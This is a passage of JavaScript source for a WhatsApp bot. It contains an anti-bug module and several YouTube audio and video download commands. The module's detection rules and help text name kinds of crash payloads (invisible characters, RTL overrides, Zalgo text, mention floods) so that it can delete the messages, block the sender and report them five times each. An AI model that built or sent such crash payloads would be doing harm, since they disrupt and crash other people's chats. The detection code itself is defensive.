      return { type: 'STICKER_EXPLOIT', detail: 'Sticker with URL suspecte', severity: 'MEDIUM' };
    }

    // 5. Flood de mentions (>20 mentions = attaque)
    const mentions = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (mentions.length > 20) {
      return { type: 'MENTION_FLOOD', detail: `${mentions.length} mentions`, severity: 'HIGH' };
    }

    return null; // Pas de bug détecté
  } catch (e) {
    console.error('Erreur detectBugPayload:', e);
    return null;
  }
}

// Gestion d'une attaque bug détectée
async function handleAntiBugTrigger(sock, message, remoteJid, senderJid, isGroup, bugInfo) {
  const senderNum = senderJid.split('@')[0];
  const now = Date.now();

  console.log(`🛡️ [ANTI-BUG] Attaque détectée de ${senderNum} | Type: ${bugInfo.type} | Sévérité: ${bugInfo.severity}`);

  // 1. Supprimer immédiatement le message malveillant
  try {
    await sock.sendMessage(remoteJid, { delete: message.key });
  } catch (e) { /* peut échouer si pas admin groupe */ }

  // 2. Mettre à jour le tracker
  const existing = antiBugTracker.get(senderJid) || { count: 0, firstSeen: now, lastSeen: now, blocked: false, attacks: [] };
  existing.count++;
  existing.lastSeen = now;
  existing.attacks.push({ type: bugInfo.type, detail: bugInfo.detail, severity: bugInfo.severity, timestamp: now });
  antiBugTracker.set(senderJid, existing);

  // 3. Si déjà bloqué, ignorer silencieusement
  if (existing.blocked) {
    console.log(`🛡️ [ANTI-BUG] ${senderNum} déjà bloqué, message supprimé silencieusement`);
    return;
  }

  // 4. Alerte dans le chat
  const severityEmoji = bugInfo.severity === 'CRITICAL' ? '☠️' : bugInfo.severity === 'HIGH' ? '🔴' : '🟡';

  await sock.sendMessage(remoteJid, {
    text: `┏━━━  🛡️ Anti-Bug - Avertissement  🛡️  ━━━┓

${severityEmoji} *Attaque de données malveillantes détectée!*

📱 Attaquant: @${senderNum}
🔍 Type d'attaque: ${bugInfo.type}
📊 Détails: ${bugInfo.detail}
⚠️ Gravité: ${bugInfo.severity}
🔢 Nombre de tentatives: ${existing.count}/5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🗑️ Message malveillant supprimé
${existing.count >= 5 ? '🔒 Bannissement immédiat...' : `⚠️ ${5 - existing.count} tentative(s) restante(s) avant bannissement`}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇷🇴 SEIGNEUR TD 🇷🇴`,
    mentions: [senderJid]
  });

  // 5. Si 5 attaques ou CRITICAL → action immédiate
  if (existing.count >= 5 || bugInfo.severity === 'CRITICAL') {
    existing.blocked = true;
    antiBugTracker.set(senderJid, existing);

    // a. Signaler 5 fois à WhatsApp
    await reportToWhatsApp(sock, senderJid, senderNum, existing.attacks);

    // b. Bloquer le contact
    try {
      await sock.updateBlockStatus(senderJid, 'block');
      console.log(`🛡️ [ANTI-BUG] ${senderNum} bloqué with succès`);
    } catch (e) {
      console.error('Erreur blocage:', e);
    }

    // c. Si groupe → expulser
    if (isGroup) {
      try {
        const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
        if (botIsAdmin) {
          await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
        }
      } catch (e) { /* silencieux */ }
    }

    // d. Message de confirmation
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  ✅ Protection exécutée  ✅  ━━━┓

☠️ *Attaquant neutralisé:*

📱 Le numéro: +${senderNum}
🔒 Statut: Banni complètement

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Signalé à WhatsApp (5 signalements)
✅ Contact bloqué
${isGroup ? '✅ expulsé(s) du Groupe' : ''}
✅ Tous les messages malveillants supprimés

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 *Journal d'attaques:*
${existing.attacks.slice(-3).map((a, i) => `${i + 1}. ${a.type} - ${a.severity}`).join('\n')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇷🇴 SEIGNEUR TD 🇷🇴
*Système de protection - Mission Terminée*`,
      mentions: [senderJid]
    });

    // e. Notifier l'admin du bot en privé
    for (const adminJid of config.adminNumbers) {
      try {
        await sock.sendMessage(adminJid, {
          text: `🚨 *signalement Anti-Bug*\n\n☠️ Attaque ${bugInfo.severity} arrêtée!\n\n📱 Attaquant: +${senderNum}\n📍 Source: ${isGroup ? 'groupe' : 'message privé'}\n🔍 Type: ${bugInfo.type}\n🔢 Tentatives: ${existing.count}\n\n✅ Fait: suppression + signalement WhatsApp + blocage${isGroup ? ' + expulsion' : ''}`
        });
      } catch (e) { /* silencieux */ }
    }
  }
}

// Envoyer des signalements à WhatsApp (5 fois)
async function reportToWhatsApp(sock, senderJid, senderNum, attacks) {
  console.log(`📨 [ANTI-BUG] Envoi de 5 signalements pour ${senderNum}...`);

  const reportReasons = [
    'spam',          // Spam
    'inappropriate', // Contenu inapproprié
    'harassment',    // Harcèlement
    'threat',        // Menace
    'other'          // Autre
  ];

  for (let i = 0; i < 5; i++) {
    try {
      // Signalement via l'API Baileys
      await sock.reportJid(senderJid, 'spam');
      console.log(`✅ [ANTI-BUG] Signalement ${i + 1}/5 envoyé`);
      await delay(800); // Délai entre chaque signalement
    } catch (e) {
      // Si reportJid n'existe pas, utiliser sendMessage vers le support WhatsApp
      try {
        await sock.sendMessage('0@s.whatsapp.net', {
          text: `REPORT: +${senderNum} is sending malicious bug payloads. Attack type: ${attacks.map(a => a.type).join(', ')}. Please ban this account.`
        });
        console.log(`✅ [ANTI-BUG] Rapport WhatsApp ${i + 1}/5 envoyé`);
      } catch (e2) {
        console.log(`⚠️ [ANTI-BUG] Signalement ${i + 1}/5 (API indisponible, traité localement)`);
      }
      await delay(500);
    }
  }

  console.log(`✅ [ANTI-BUG] 5 signalements complétés pour ${senderNum}`);
}

// Commande !antibug (toggle + status + liste)
async function handleAntiBugCommand(sock, args, remoteJid, senderJid) {
  const sub = args[0]?.toLowerCase();

  // !antibug list → liste des attaquants détectés
  if (sub === 'list') {
    if (antiBugTracker.size === 0) {
      await sock.sendMessage(remoteJid, {
        text: `🛡️ *Liste Anti-Bug*\n\n✅ Aucune attaque enregistrée`
      });
      return;
    }

    let listText = `┏━━━  🛡️ Journal d'attaques  🛡️  ━━━┓\n\n`;
    let i = 1;
    for (const [jid, data] of antiBugTracker.entries()) {
      const num = jid.split('@')[0];
      const date = new Date(data.lastSeen).toLocaleString('ar-SA', { timeZone: 'Africa/Ndjamena' });
      const status = data.blocked ? '🔒 Banni' : `⚠️ ${data.count} Avertissement`;
      listText += `${i}. +${num}\n   ${status} | ${data.attacks[0]?.type || '?'}\n   📅 ${date}\n\n`;
      i++;
    }
    listText += `┗━━━━━━━━━━━━━━━━━━━━━━┛\n`;
    listText += `📊 Total: ${antiBugTracker.size} personne(s)`;

    await sock.sendMessage(remoteJid, { text: listText });
    return;
  }

  // !antibug clear → vider le tracker
  if (sub === 'clear') {
    const count = antiBugTracker.size;
    antiBugTracker.clear();
    await sock.sendMessage(remoteJid, {
      text: `🗑️ Journal d'attaques effacé (${count} entrée(s))`
    });
    return;
  }

  // !antibug unblock <number> → débloquer manuellement
  if (sub === 'unblock' && args[1]) {
    const num = args[1].replace(/[^0-9]/g, '');
    const jid = num + '@s.whatsapp.net';
    try {
      await sock.updateBlockStatus(jid, 'unblock');
      antiBugTracker.delete(jid);
      await sock.sendMessage(remoteJid, {
        text: `✅ Bannissement levé pour +${num}`
      });
    } catch (e) {
      await sock.sendMessage(remoteJid, {
        text: `❌ Erreur lors du débannissement: ${e.message}`
      });
    }
    return;
  }

  // !antibug (sans argument) → toggle ON/OFF
  antiBug = !antiBug;
  saveStoreKey('config');

  const statusEmoji = antiBug ? '✅' : '❌';
  const statusText  = antiBug ? 'Activé' : 'Désactivé';

  await sock.sendMessage(remoteJid, {
    text: `┏━━━  🛡️ Anti-Bug  🛡️  ━━━┓

${statusEmoji} *Statut: ${statusText}*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 *Ce qui est détecté:*

☠️ Caractères arabes malveillants (Crash)
🐛 Flood d'emojis (>50)
👻 Caractères invisibles (>20)
🌀 Texte Zalgo (distorsion)
📏 Messages massifs (>5000 caractères)
🀄 Caractères chinois intensifs (>200)
↪️ RTL Override multiple
📌 Flood de mentions (>20)
🖼️ ContextInfo malveillant
👁️ ViewOnce avec Payload
🎯 Sticker URL Suspect

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *Action à la détection:*

1️⃣ Suppression immédiate du message
2️⃣ Avertissement dans le chat
3️⃣ Après 5 attaques:
   • 📨 5 signalements à WhatsApp
   • 🔒 Blocage du contact
   • 🚫 Expulsion du Groupe
   • 📲 Notification à l'admin

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 *Commandes supplémentaires:*

• !antibug list     → Journal d'attaques
• !antibug clear    → Effacer le journal
• !antibug unblock [numéro] → Lever le bannissement

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🛡️ Attaques détectées: ${antiBugTracker.size}
🔒 Bannis: ${[...antiBugTracker.values()].filter(v => v.blocked).length}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇷🇴 SEIGNEUR TD 🇷🇴`
  });
}

// =============================================
// 📥 FONCTIONS DE DOWNLOAD
// =============================================
// Dépendances requises (à installer sur votre serveur):
//   npm install @distube/ytdl-core play-dl node-fetch
// =============================================

// Importer dynamiquement pour éviter crash si non installé
async function getYtdl() {
  try { return (await import('@distube/ytdl-core')).default; }
  catch { return null; }
}
async function getPlayDl() {
  try { return await import('play-dl'); }
  catch { return null; }
}
async function getFetch() {
  try { return (await import('node-fetch')).default; }
  catch {
    try { return (await import('axios')).default; }
    catch { return null; }
  }
}

// ─── YOUTUBE AUDIO (MP3) - utilise play-dl uniquement (pas ytdl) ─────────────
async function handleYouTubeAudio(sock, args, remoteJid, senderJid, message) {
  if (!args.length) {
    await sock.sendMessage(remoteJid, {
      text: `🎵 *Télécharger audio YouTube*\n\nUtilisation:\n${config.prefix}play [titre ou lien]\n\nExemples:\n${config.prefix}play despacito\n${config.prefix}play https://youtu.be/xxx`
    });
    return;
  }

  const query = args.join(' ');
  const loadMsg = await sock.sendMessage(remoteJid, {
    text: `🔍 *Recherche en cours...*\n🎵 ${query}`
  });

  try {
    const playDl = await getPlayDl();
    if (!playDl) {
      await sock.sendMessage(remoteJid, {
        text: `❌ *play-dl non installé*\n\nLancer sur le serveur:\n\`npm install play-dl\``,
        edit: loadMsg.key
      });
      return;
    }

    // 1. Chercher la vidéo
    let videoUrl, title, author, duration;
    if (query.includes('youtube.com') || query.includes('youtu.be')) {
      videoUrl = query.trim();
    } else {
      const results = await playDl.search(query, { source: { youtube: 'video' }, limit: 1 });
      if (!results?.length) {
        await sock.sendMessage(remoteJid, { text: '❌ Aucun résultat trouvé', edit: loadMsg.key });
        return;
      }
      videoUrl = results[0].url;
      title    = results[0].title || query;
      author   = results[0].channel?.name || 'Unknown';
      duration = results[0].durationInSec || 0;
    }

    // 2. Obtenir les infos si pas déjà récupérées
    if (!title) {
      try {
        const info = await playDl.video_info(videoUrl);
        title    = info.video_details.title || 'Unknown';
        author   = info.video_details.channel?.name || 'Unknown';
        duration = info.video_details.durationInSec || 0;
      } catch(e) {
        title = query; author = 'Unknown'; duration = 0;
      }
    }

    // 3. Vérifier durée (max 10 min)
    if (duration > 600) {
      await sock.sendMessage(remoteJid, {
        text: `⚠️ Vidéo trop longue!\n⏱️ ${Math.floor(duration/60)}:${String(duration%60).padStart(2,'0')}\n🚫 Limite maximale: 10 minutes`,
        edit: loadMsg.key
      });
      return;
    }

    await sock.sendMessage(remoteJid, {
      text: `📥 *Chargement......*\n🎵 ${title}\n👤 ${author}\n⏱️ ${Math.floor(duration/60)}:${String(duration%60).padStart(2,'0')}`,
      edit: loadMsg.key
    });

    // 4. Streamer with play-dl (pas de "Sign in" car play-dl contourne ça)
    const stream = await playDl.stream(videoUrl, { quality: 0 }); // quality 0 = meilleur audio
    const chunks = [];
    await new Promise((resolve, reject) => {
      stream.stream.on('data', c => chunks.push(c));
      stream.stream.on('end', resolve);
      stream.stream.on('error', reject);
    });
    const audioBuffer = Buffer.concat(chunks);

    // 5. Envoyer l'audio
    await sock.sendMessage(remoteJid, {
      audio: audioBuffer,
      mimetype: 'audio/mp4',
      ptt: false
    });

    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🎵 Audio YouTube  ━━━┓\n\n🎵 *${title}*\n👤 ${author}\n⏱️ ${Math.floor(duration/60)}:${String(duration%60).padStart(2,'0')}\n📏 ${(audioBuffer.length/1024/1024).toFixed(2)} MB\n\n┗━━━━━━━━━━━━━━━━━━━━━━┛\n*㋛ SEIGNEUR TD 🇷🇴* 🇷🇴`,
      edit: loadMsg.key
    });

  } catch (err) {
    console.error('Erreur YouTube audio:', err.message);
    await sock.sendMessage(remoteJid, {
      text: `❌ *Erreur de téléchargement*\n\n${err.message}\n\n💡 Essaie:\n• des mots-clés différents\n• un lien YouTube direct\n• Vérifie: \`npm install play-dl\``,
      edit: loadMsg.key
    });
  }
}

// ─── YOUTUBE VIDEO (MP4) - utilise play-dl uniquement ────────────────────────
async function handleYouTubeVideo(sock, args, remoteJid, senderJid, message) {
  if (!args.length) {
    await sock.sendMessage(remoteJid, {
      text: `🎬 *Télécharger vidéo YouTube*\n\nUtilisation:\n${config.prefix}ytvideo [titre ou lien]\n\nExemple:\n${config.prefix}ytvideo funny cats`
    });
    return;
  }

  const query = args.join(' ');
  const loadMsg = await sock.sendMessage(remoteJid, {
    text: `🔍 *Recherche de la vidéo...*\n🎬 ${query}`
  });

  try {
    const playDl = await getPlayDl();
    if (!playDl) {
      await sock.sendMessage(remoteJid, {
        text: `❌ *play-dl non installé*\n\nLancer: \`npm install play-dl\``,
        edit: loadMsg.key
      });
      return;
    }

    let videoUrl, title, author, duration;
    if (query.includes('youtube.com') || query.includes('youtu.be')) {
      videoUrl = query.trim();
    } else {
      const results = await playDl.search(query, { source: { youtube: 'video' }, limit: 1 });
      if (!results?.length) {
        await sock.sendMessage(remoteJid, { text: '❌ Aucun résultat trouvé', edit: loadMsg.key });
        return;
      }
      videoUrl = results[0].url;
      title    = results[0].title || query;
      author   = results[0].channel?.name || 'Unknown';
      duration = results[0].durationInSec || 0;
    }

    if (!title) {
      try {
        const info = await playDl.video_info(videoUrl);
        title    = info.video_details.title || 'Unknown';
        author   = info.video_details.channel?.name || 'Unknown';
        duration = info.video_details.durationInSec || 0;
      } catch(e) {
        title = query; author = 'Unknown'; duration = 0;
      }
    }

    // Max 5 minutes pour vidéo
    if (duration > 300) {
      await sock.sendMessage(remoteJid, {
        text: `⚠️ Vidéo trop longue!\n⏱️ ${Math.floor(duration/60)}:${String(duration%60).padStart(2,'0')}\n🚫 Limite maximale: 5 دقائق\n\n💡 Utilise ${config.prefix}play pour l'audio`,
        edit: loadMsg.key
      });
      return;
    }

    await sock.sendMessage(remoteJid, {
      text: `📥 *Téléchargement de la vidéo...*\n🎬 ${title}`,
      edit: loadMsg.key
    });

    // Stream vidéo with play-dl (360p)
    const stream = await playDl.stream(videoUrl, { quality: 2 }); // quality 2 = 360p approx
    const chunks = [];
    await new Promise((resolve, reject) => {
      stream.stream.on('data', c => chunks.push(c));
      stream.stream.on('end', resolve);
      stream.stream.on('error', reject);
    });
    const videoBuffer = Buffer.concat(chunks);

    if (videoBuffer.length > 60 * 1024 * 1024) {
      await sock.sendMessage(remoteJid, {
        text: `⚠️ Vidéo trop grande (${(videoBuffer.length/1024/1024).toFixed(1)} MB)\n🚫 Limite: 60 MB\n\n💡 Utilise ${config.prefix}play pour l'audio`,
        edit: loadMsg.key
      });
      return;
    }

    await sock.sendMessage(remoteJid, {
      video: videoBuffer,
      mimetype: 'video/mp4',
      caption: `┏━━━  🎬 Vidéo YouTube  ━━━┓\n\n🎬 *${title}*\n👤 ${author}\n⏱️ ${Math.floor(duration/60)}:${String(duration%60).padStart(2,'0')}\n📏 ${(videoBuffer.length/1024/1024).toFixed(2)} MB\n\n┗━━━━━━━━━━━━━━━━━━━━━━┛\n*㋛ SEIGNEUR TD 🇷🇴* 🇷🇴`
    });

    try { await sock.sendMessage(remoteJid, { delete: loadMsg.key }); } catch(e) {}

  } catch (err) {
    console.error('Erreur YouTube video:', err.message);
    await sock.sendMessage(remoteJid, {
      text: `❌ *Erreur de téléchargement*\n\n${err.message}\n\n💡 Essaie ${config.prefix}play pour l'audio seulement`,
      edit: loadMsg.key
    });
  }
}

// =============================================
// 🎵 NOUVEAU SYSTÈME PLAY — API + MENU INTERACTIF
// =============================================

// ─── HELPER: Trouver le videoId YouTube ──────────────────────────────────────
async function ytGetVideoId(query) {
  // Si c'est déjà un lien YouTube
  const ytMatch = query.match(/(?:youtu\.be\/|[?&]v=)([\w-]{11})/);
  if (ytMatch) return { videoId: ytMatch[1], title: query };

  // Chercher via YouTube Data API v3
  try {
    const apiUrl = `https://www.googleapis.com/youtube/v3/search?part=snippet&q=${encodeURIComponent(query)}&type=video&maxResults=1&key=${config.youtubeApiKey}`;
    const r    = await fetch(apiUrl, { signal: AbortSignal.timeout(12000) });
    const json = await r.json();
    const item = json?.items?.[0];
    if (item) return { videoId: item.id?.videoId, title: item.snippet?.title || query };
  } catch(e) { console.error('[YT Data API]', e.message); }

  // Fallback: chercher sur une API tierce
  try {
    const r = await fetch(`https://api-faa.my.id/faa/ytplayvid?q=${encodeURIComponent(query)}`, { signal: AbortSignal.timeout(12000) });
    const d = await r.json();
    if (d?.result?.searched_url) {
      const m = d.result.searched_url.match(/v=([\w-]{11})/);
      if (m) return { videoId: m[1], title: d.result.searched_title || query };
    }
  } catch(e) { console.error('[FAA API]', e.message); }

  throw new Error('Vidéo introuvable sur YouTube');
}

// ─── HELPER: Téléchargement AUDIO (MP3) ──────────────────────────────────────
async function ytResolveAudio(query) {
  const { videoId, title } = await ytGetVideoId(query);
  const watchUrl = `https://www.youtube.com/watch?v=${videoId}`;
  console.log('[ytResolveAudio] videoId:', videoId, 'title:', title);

  const audioApis = [
    // 1. cobalt.tools — audio only
    async () => {
      const r = await fetch('https://api.cobalt.tools/api/json', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify({ url: watchUrl, isAudioOnly: true, aFormat: 'mp3' }),
        signal: AbortSignal.timeout(20000)
      });
      const d = await r.json();
      if ((d.status === 'stream' || d.status === 'redirect') && d.url) return d.url;
      if (d.status === 'picker' && (d.audio || d.picker?.[0]?.url)) return d.audio || d.picker[0].url;
      throw new Error('cobalt audio: ' + (d.text || d.status || 'no url'));
    },
    // 2. y2mate — MP3
    async () => {
      const r1 = await fetch('https://www.y2mate.com/mates/analyzeV2/ajax', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `k_query=${encodeURIComponent(watchUrl)}&k_page=home&hl=en&q_auto=0`,
        signal: AbortSignal.timeout(15000)
      });
      const d1 = await r1.json();
      if (!d1.links?.mp3) throw new Error('y2mate: no mp3');
      const kId = Object.values(d1.links.mp3)[0]?.k;
      if (!kId) throw new Error('y2mate: no key');
      const r2 = await fetch('https://www.y2mate.com/mates/convertV2/index', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `vid=${videoId}&k=${kId}`,
        signal: AbortSignal.timeout(20000)
      });
      const d2 = await r2.json();
      if (d2.dlink) return d2.dlink;
      throw new Error('y2mate: no dlink');
    },
    // 3. loader.to — MP3
    async () => {
      const r1 = await fetch(`https://loader.to/ajax/download.php?format=mp3&url=${encodeURIComponent(watchUrl)}`, { signal: AbortSignal.timeout(15000) });
      const d1 = await r1.json();
      if (!d1.id) throw new Error('loader.to: no id');
      for (let i = 0; i < 12; i++) {
        await new Promise(r => setTimeout(r, 3000));
        const rp = await fetch(`https://loader.to/ajax/progress.php?id=${d1.id}`, { signal: AbortSignal.timeout(10000) });
        const dp = await rp.json();
        if (dp.download_url) return dp.download_url;
      }
      throw new Error('loader.to: timeout');
    },
  ];

  let lastErr = null;
  for (const api of audioApis) {
    try {
      const url = await api();
      if (url) { console.log('[ytResolveAudio] URL:', url); return { audioUrl: url, title, watchUrl, videoId }; }
    } catch(e) { lastErr = e; console.error('[ytResolveAudio API failed]', e.message); }
  }
  throw new Error(`Audio indisponible: ${lastErr?.message}`);
}

// ─── HELPER: Téléchargement VIDÉO (MP4) ──────────────────────────────────────
async function ytResolveVideo(query) {
  const { videoId, title } = await ytGetVideoId(query);
  const watchUrl = `https://www.youtube.com/watch?v=${videoId}`;
  console.log('[ytResolveVideo] videoId:', videoId, 'title:', title);

  const videoApis = [
    // 1. savefrom.net — axios
    async () => {
      const r = await axios.get(`https://api.savefrom.net/getInfo.php?url=${encodeURIComponent(watchUrl)}`, {
        headers: { 'User-Agent': 'Mozilla/5.0' },
        timeout: 20000
      });
      const match = r.data.match ? r.data.match(/"url":"(https:[^"]+\.mp4[^"]*)"/) : JSON.stringify(r.data).match(/"url":"(https:[^"]+\.mp4[^"]*)"/) ;
      if (match) return match[1].replace(/\\/g, '');
      throw new Error('savefrom: no mp4 url');
    },

    // 2. cobalt.tools — axios
    async () => {
      const r = await axios.post('https://api.cobalt.tools/api/json', {
        url: watchUrl,
        vQuality: '360',
        isAudioMuted: false
      }, {
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        timeout: 30000
      });
      const d = r.data;
      if ((d.status === 'stream' || d.status === 'redirect') && d.url) return d.url;
      if (d.status === 'picker' && d.picker?.length > 0) return d.picker[0].url;
      throw new Error('cobalt: ' + (d.text || d.status));
    },

    // 3. y2mate — axios
    async () => {
      const r1 = await axios.post('https://www.y2mate.com/mates/analyzeV2/ajax',
        `k_query=${encodeURIComponent(watchUrl)}&k_page=home&hl=en&q_auto=0`,
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 25000 }
      );
      const d1 = r1.data;
      if (!d1.links?.mp4) throw new Error('y2mate: no mp4');
      const qualities = ['360p','144p','240p','480p'];
      let kId = null;
      for (const q of qualities) {
        if (d1.links.mp4[q]?.k) { kId = d1.links.mp4[q].k; break; }
      }
      if (!kId) kId = Object.values(d1.links.mp4)[0]?.k;
      if (!kId) throw new Error('y2mate: no key');
      const r2 = await axios.post('https://www.y2mate.com/mates/convertV2/index',
        `vid=${videoId}&k=${kId}`,
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 30000 }
      );
      const d2 = r2.data;
      if (d2.dlink) return d2.dlink;
      throw new Error('y2mate: no dlink');
    },

    // 4. YouTube direct — axios
    async () => {
      const r = await axios.get(watchUrl, {
        headers: { 'User-Agent': 'Mozilla/5.0' },
        timeout: 15000
      });
      const html = r.data;
      const match = html.match(/"streamingData":\s*({[^}]+})/);
      if (match) {
        const data = JSON.parse(match[1]);
        if (data.formats?.length > 0) {
          const fmt = data.formats.find(f => f.mimeType?.includes('video/mp4') && f.audioQuality);
          if (fmt?.url) return fmt.url;
        }
      }
      throw new Error('youtube direct: no format');
    },
  ];

  let lastErr = null;
  for (const api of videoApis) {
    try {
      const url = await api();
      if (url) { console.log('[ytResolveVideo] URL:', url); return { videoUrl: url, title, watchUrl, videoId }; }
    } catch(e) { lastErr = e; console.error('[ytResolveVideo API failed]', e.message); }
  }
  throw new Error(`Vidéo indisponible: ${lastErr?.message}`);
}

// Compatibilité ytSearch pour handlePlayMenu (cherche audio par défaut)
async function ytSearch(searchQuery) {
  const result = await ytResolveAudio(searchQuery);
  return {
    status: true,
    result: {
      searched_title: result.title,
      searched_url:   result.watchUrl,
      download_url:   result.audioUrl,
      videoId:        result.videoId
    }
  };
}

// Menu principal !play → choix audio/vidéo/ptt
async function handlePlayMenu(sock, args, remoteJid, senderJid, message) {
  const searchQuery = args.join(' ');

  // Réaction ✨
  try {
    await sock.sendMessage(remoteJid, { react: { text: "✨", key: message.key } });
  } catch(e) {}

  try {
    const data = await ytSearch(searchQuery);

    if (!data?.status || !data?.result) {
      await sock.sendMessage(remoteJid, { text: "❌ Video not found." });
      return;
    }

    const res = data.result;
    const p = config.prefix;

    const menuText =
`🎶 *YouTube Player*

📌 Title: *${res.searched_title || searchQuery}*
🔗 Link: ${res.searched_url || 'N/A'}

━━━━━━━━━━━━━━━━━━━━━━━
*Choose the format:*

1️⃣ ${p}playaudio ${searchQuery}
   → 🎵 Audio MP3

2️⃣ ${p}playvideo ${searchQuery}
   → 🎬 Vidéo MP4

3️⃣ ${p}playptt ${searchQuery}
   → 🎤 Voice message (PTT)

━━━━━━━━━━━━━━━━━━━━━━━
_Reply with the command of your choice_`;

    await sock.sendMessage(remoteJid, { text: menuText }, { quoted: message });

    // 🎵 Audio automatique après le menu play (si play.mp3 existe)

    try {
      await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } });
    } catch(e) {}

  } catch (e) {
    console.error("PLAY MENU ERROR:", e.message);
    await sock.sendMessage(remoteJid, {
      text: "❌ Error while searching YouTube.\n\n💡 Please try again in a few seconds."
    });
  }
}

// !playaudio → Audio MP3
async function handlePlayAudio(sock, args, remoteJid, senderJid, message) {
  const searchQuery = args.join(' ');

  try {
    await sock.sendMessage(remoteJid, { react: { text: "🎵", key: message.key } });
  } catch(e) {}

  await sock.sendMessage(remoteJid, { text: "⏳ Downloading audio..." });

  try {
    const data = await ytSearch(searchQuery);

    if (!data?.status || !data?.result) {
      await sock.sendMessage(remoteJid, { text: "❌ Video not found." });
      return;
    }

    const res = data.result;

    // Télécharger l'audio (fetch natif - vraie URL MP3)
    console.log('[AUDIO DL] URL:', res.download_url);
    const audioFetch = await fetch(res.download_url, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      signal: AbortSignal.timeout(90000)
    });
    if (!audioFetch.ok) throw new Error(`Download HTTP ${audioFetch.status}`);
    const audioData = Buffer.from(await audioFetch.arrayBuffer());
    if (audioData.length < 1000) throw new Error('Fichier audio vide ou invalide');
    console.log('[AUDIO DL] Size:', audioData.length, 'bytes');

    await sock.sendMessage(remoteJid, {
      audio: audioData,
      mimetype: "audio/mpeg",
      fileName: `${res.searched_title || 'audio'}.mp3`,
    }, { quoted: message });

    await sock.sendMessage(remoteJid, {
      text: `🎶 *YouTube Audio*\n📌 *${res.searched_title || searchQuery}*`
    }, { quoted: message });

    try {
      await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } });
    } catch(e) {}

  } catch (e) {
    console.error("PLAY AUDIO ERROR:", e.message);
    await sock.sendMessage(remoteJid, {
      text: "❌ Error while downloading audio.\n\n💡 Check the title or try again."
    });
  }
}

// !playvideo → Vidéo MP4
async function handlePlayVideo(sock, args, remoteJid, senderJid, message) {
  const searchQuery = args.join(' ');

  try {
    await sock.sendMessage(remoteJid, { react: { text: "🎬", key: message.key } });
  } catch(e) {}

  await sock.sendMessage(remoteJid, { text: "⏳ Downloading video... (may take 15-30s)" });

  try {
    // Utilise ytResolveVideo dédié pour obtenir une vraie URL MP4
    const result = await ytResolveVideo(searchQuery);

    // Télécharger le buffer vidéo
    console.log('[VIDEO DL] URL:', result.videoUrl);
    const videoFetch = await fetch(result.videoUrl, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      signal: AbortSignal.timeout(180000)
    });
    if (!videoFetch.ok) throw new Error(`Download HTTP ${videoFetch.status}`);
    const videoData = Buffer.from(await videoFetch.arrayBuffer());
    if (videoData.length < 10000) throw new Error('Fichier vidéo vide ou invalide');
    console.log('[VIDEO DL] Size:', videoData.length, 'bytes');

    await sock.sendMessage(remoteJid, {
      video: videoData,
      mimetype: 'video/mp4',
      caption: `🎬 *YouTube Video*\n📌 *${result.title || searchQuery}*\n📏 ${(videoData.length/1024/1024).toFixed(1)} MB`,
      fileName: `${result.title || 'video'}.mp4`
    }, { quoted: message });

    try {
      await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } });
    } catch(e) {}

  } catch (e) {
    console.error("PLAYVIDEO ERROR:", e.message);
    await sock.sendMessage(remoteJid, {
      text: `❌ *Video error:* ${e.message}\n\n💡 Try !playaudio for audio only.`
    }, { quoted: message });
  }
}

// !playptt → Voice message (PTT)
async function handlePlayPTT(sock, args, remoteJid, senderJid, message) {
  const searchQuery = args.join(' ');

  try {
    await sock.sendMessage(remoteJid, { react: { text: "🎤", key: message.key } });
  } catch(e) {}

  await sock.sendMessage(remoteJid, { text: "⏳ Downloading voice message..." });

  try {
    const data = await ytSearch(searchQuery);

    if (!data?.status || !data?.result) {
      await sock.sendMessage(remoteJid, { text: "❌ Video not found." });
      return;
    }

    const res = data.result;

    // Télécharger comme audio (fetch natif - vraie URL MP3)
    console.log('[PTT DL] URL:', res.download_url);
    const audioFetch = await fetch(res.download_url, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      signal: AbortSignal.timeout(90000)
    });
    if (!audioFetch.ok) throw new Error(`Download HTTP ${audioFetch.status}`);
    const audioData = Buffer.from(await audioFetch.arrayBuffer());
    if (audioData.length < 1000) throw new Error('Fichier audio vide ou invalide');

    // Envoyer en mode PTT (message vocal)
    await sock.sendMessage(remoteJid, {
      audio: audioData,
      mimetype: "audio/mpeg",
      ptt: true
    }, { quoted: message });

    await sock.sendMessage(remoteJid, {
      text: `🎤 *Voice Note*\n📌 *${res.searched_title || searchQuery}*`
    });

    try {
      await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } });
    } catch(e) {}

  } catch (e) {
    console.error("PLAY PTT ERROR:", e.message);
    await sock.sendMessage(remoteJid, {
      text: "❌ Error while downloading PTT.\n\n💡 Try again or use !playaudio"
    });
  }
}

// ─── GPT ─────────────────────────────────────────────────────────────────────
async function handleGPT(sock, args, remoteJid, senderJid, message) {
